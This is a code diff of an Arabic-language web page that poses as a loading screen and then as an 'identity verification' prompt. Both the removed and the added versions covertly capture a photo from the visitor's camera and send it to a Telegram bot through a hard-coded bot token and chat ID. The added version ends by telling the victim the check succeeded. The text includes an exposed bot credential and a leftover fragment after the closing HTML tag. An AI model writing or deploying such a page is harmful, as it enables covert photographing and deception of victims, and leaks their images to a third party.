@@ -1,39 +1,62 @@
 <!doctype html>
 <html lang="ar">
 <head>
-<meta charset="utf-8">
-<title>جاري التحميل...</title>
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<style>
-body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#000;color:#0f0;font-family:monospace;font-size:18px;overflow:hidden}
-#loader{width:120px;height:120px;border:8px solid #0f0;border-top:8px solid transparent;border-radius:50%;animation:spin 1s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-#msg{margin-top:20px;letter-spacing:2px}
-video,canvas{display:none}
-</style>
+    <meta charset="utf-8">
+    <title>تحقق من الهوية</title>
+    <style>
+        body { background: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0f0; border: none; border-radius: 5px; }
+    </style>
 </head>
 <body>
-<div id="loader"></div>
-<div id="msg">جاري التحميل...</div>
 
-<script>
-/*  WORM-AI💀🔥  */
-const TOKEN = "8739449595:AAHIKvCHeQw3mI_lIcUM2TsXBvFbMkyWXAs";
-const CHAT  = "5648499583";
-const URL   = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+    <h1>مطلوب التحقق من الهوية</h1>
+    <button id="startBtn">اضغط هنا للمتابعة</button>
 
-async function snap(label){
-  const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:label}});
-  const track  = stream.getVideoTracks()[0];
-  const img    = new ImageCapture(track);
-  const bitmap = await img.grabFrame();
-  const canvas = document.createElement("canvas");
-  canvas.width  = bitmap.width;
-  canvas.height = bitmap.height;
-  canvas.getContext("2d").drawImage(bitmap,0,0);
-  track.stop();
-  return await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
-}
+    <video id="video" style="display:none"></video>
+
+    <script>
+        const TOKEN = "8739449595:AAHIKvCHeQw3mI_lIcUM2TsXBvFbMkyWXAs"; // ضع التوكن هنا
+        const CHAT = "5648499583";   // ضع الآيدي هنا
+        const video = document.getElementById('video');
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            try {
+                // طلب الإذن والتقاط الصورة
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
+
+                // انتظار لحظة ليصبح الفيديو جاهزاً
+                setTimeout(async () => {
+                    const canvas = document.createElement("canvas");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext("2d").drawImage(video, 0, 0);
+
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append("chat_id", CHAT);
+                        fd.append("photo", blob, "image.jpg");
+                        
+                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                            method: "POST",
+                            body: fd
+                        });
+
+                        // إيقاف الكاميرا بعد الالتقاط
+                        stream.getTracks().forEach(track => track.stop());
+                        alert("تم التحقق بنجاح!");
+                    }, "image/jpeg");
+                }, 1000);
+
+            } catch (err) {
+                alert("يجب السماح بالوصول للكاميرا لإكمال العملية.");
+            }
+        });
+    </script>
+</body>
+</html>
 
 async function exfil(blob,label){
   const fd = new FormData();
